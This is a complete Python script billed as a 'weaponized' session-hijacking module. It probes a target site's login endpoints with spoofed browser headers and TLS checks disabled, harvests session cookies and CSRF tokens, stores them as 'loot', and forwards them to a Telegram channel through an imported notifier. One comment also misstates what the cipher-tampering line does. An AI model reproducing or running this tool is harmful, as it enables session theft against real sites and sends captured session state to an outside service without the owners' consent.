#!/usr/bin/env python3
"""
SESSION_HIJACKER.PY — Advanced Session Seeding & Token Replay (Multi-Project Edition with Telegram Telemetry)
Weaponized Red-Team Module: Dynamic target resolution, multi-framework CSRF harvesting,
robust cookie-jar state synchronization, centralized loot persistence, and real-time Telegram broadcasting.
"""
import sys
import json
import httpx
from bs4 import BeautifulSoup
from urllib.parse import urlsplit

# Import centralized framework loot exfiltration, telemetry, and Telegram notifier
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert

# Suppress insecure HTTPS warnings if self-signed certs are used in pre-production
httpx._config.DEFAULT_CIPHERS += ":HIGH:!MEDIUM:!LOW:!NULL"

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
    try:
        import asyncio
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            import asyncio
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

def exploit_session(target_url):
    """
    Harvests active session cookies, CSRF tokens, and transport state 
    dynamically for any provided pre-production target URL with multi-vector verification.
    """
    if not target_url:
        print("[-] Error: No target URL supplied to session hijacker.")
        return None, None

    # Normalize target URL dynamically
    formatted_url = target_url if "://" in target_url else f"https://{target_url}"
    parsed = urlsplit(formatted_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    # Check both standard login and auth entry points across frameworks
    target_entry_paths = ["/user/login", "/login", "/auth/login", "/api/auth/login", "/admin"]
    
    base_headers = [
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "X-Requested-With": "XMLHttpRequest"
        },
        {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
            "Accept": "application/json, text/plain, */*"
        }
    ]

    with httpx.Client(verify=False, follow_redirects=True, timeout=10.0) as client:
        resp = None
        used_url = ""
        active_headers = base_headers[0]
        
        # Probe potential login/auth gateways dynamically with header/method variations
        for path in target_entry_paths:
            test_url = f"{base_url}{path}"
            for headers in base_headers:
                try:
                    # Test GET first
                    resp = client.get(test_url, headers=headers)
                    if resp.status_code < 400:
                        used_url = test_url
                        active_headers = headers
                        print(f"[+] Successfully established transport gate at: {used_url} (Status: {resp.status_code})")
                        break
                    
                    # Fallback method mutation (POST/OPTIONS check if GET is locked)
                    resp = client.post(test_url, headers=headers, json={})
                    if resp.status_code < 400:
                        used_url = test_url
                        active_headers = headers
                        print(f"[+] Successfully established POST transport gate at: {used_url}")
                        break
                except Exception as e:
                    continue
            if resp and resp.status_code < 400:
                break

        if not resp or resp.status_code >= 400:
            print(f"[-] Failed to establish session handshake with {base_url}. Check target availability.")
            return None, None

        # Parse DOM to harvest CSRF tokens across Laravel (_token) or SPA meta tags
        soup = BeautifulSoup(resp.text, "html.parser")
        
        token_input = (
            soup.find("input", {"name": "_token"}) or 
            soup.find("input", {"name": "csrf_token"}) or
            soup.find("input", {"name": "authenticity_token"})
        )
        
        csrf_val = None
        if token_input:
            csrf_val = token_input.get("value")
        else:
            meta_token = soup.find("meta", {"name": "csrf-token"}) or soup.find("meta", {"name": "xsrf-token"})
            if meta_token:
                csrf_val = meta_token.get("content")

        captured_cookies = dict(client.cookies)
        
        if captured_cookies or csrf_val:
            print(f"[+] Captured Session Cookie Jar: {captured_cookies}")
            print(f"[+] Harvested Replay CSRF Token: {csrf_val if csrf_val else 'None (Stateless JWT / Header Auth)'}")
            
            harvest_data = {
                "base_url": base_url,
                "cookies": captured_cookies,
                "csrf_token": csrf_val,
                "gateway_url": used_url
            }

            # STREAM LIVE TELEMETRY, DISK PERSISTENCE & TELEGRAM NOTIFICATION
            broadcast_tg_alert_sync("Session Seed Harvested", harvest_data)
            stream_proof("SESSION_SEED_HARVESTED", used_url, {"headers": active_headers}, resp.text[:300], harvest_data)
            save_session_loot(
                target=base_url,
                endpoint=used_url,
                finding_type="SESSION_SEED_HARVESTED",
                status=resp.status_code,
                headers=dict(resp.headers),
                body=resp.text,
                extra_loot=harvest_data
            )

            return {
                "base_url": base_url,
                "cookies": captured_cookies,
                "csrf_token": csrf_val,
                "headers": active_headers
            }, csrf_val
        else:
            print("[-] Warning: Handshake completed but no session cookies or tokens were issued.")
            return None, None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else None
    if not target:
        print("Usage: python3 session_hijacker.py <target_url>")
        sys.exit(1)
    exploit_session(target)
